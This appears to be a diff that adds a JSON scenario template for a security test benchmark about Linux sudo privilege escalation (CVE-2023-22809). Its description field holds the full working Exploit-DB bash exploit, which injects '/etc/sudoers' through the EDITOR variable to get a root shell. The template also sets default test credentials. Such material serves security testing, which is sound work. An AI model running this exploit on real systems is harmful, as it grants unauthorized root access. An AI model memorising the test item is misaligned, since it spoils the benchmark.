@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_51217",
+  "category": "A2_sudo",
+  "attack_technique": "T1548.003",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: sudo 1.8.0 to 1.9.12p1 - Privilege Escalation (CVE-2023-22809)\n\nExploit source code (51217.sh):\n```\n#!/usr/bin/env bash\n\n# Exploit Title: sudo 1.8.0 to 1.9.12p1 - Privilege Escalation\n# Exploit Author: n3m1.sys\n# CVE: CVE-2023-22809\n# Date: 2023/01/21\n# Vendor Homepage: https://www.sudo.ws/\n# Software Link: https://www.sudo.ws/dist/sudo-1.9.12p1.tar.gz\n# Version: 1.8.0 to 1.9.12p1\n# Tested on: Ubuntu Server 22.04 - vim 8.2.4919 - sudo 1.9.9\n#\n# Git repository: https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc\n#\n# Running this exploit on a vulnerable system allows a localiattacker to gain\n# a root shell on the machine.\n#\n# The exploit checks if the current user has privileges to run sudoedit or\n# sudo -e on a file as root. If so it will open the sudoers file for the\n# attacker to add a line to gain privileges on all the files and get a root\n# shell.\n\nif ! sudo --version | head -1 | grep -qE '(1\\.8.*|1\\.9\\.[0-9]1?(p[1-3])?|1\\.9\\.12p1)$'\nthen\n    echo \"> Currently installed sudo version is not vulnerable\"\n    exit 1\nfi\n\nEXPLOITABLE=$(sudo -l | grep -E \"sudoedit|sudo -e\" | grep -E '\\(root\\)|\\(ALL\\)|\\(ALL : ALL\\)' | cut -d ')' -f 2-)\n\nif [ -z \"$EXPLOITABLE\" ]; then\n    echo \"> It doesn't seem that this user can run sudoedit as root\"\n    read -p \"Do you want to proceed anyway? (y/N): \" confirm && [[ $confirm == [yY] ]] || exit 2\nelse\n    echo \"> BINGO! User exploitable\"\n    echo \"> Opening sudoers file, please add the following line to the file in order to do the privesc:\"\n    echo \"$( whoami ) ALL=(ALL:ALL) ALL\"\n    read -n 1 -s -r -p \"Press any key to continue...\"\n    EDITOR=\"vim -- /etc/sudoers\" $EXPLOITABLE\n    sudo su root\n    exit 0\nfi\n```",
+  "cve": "CVE-2023-22809",
+  "exploitdb_id": "51217",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_51217",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
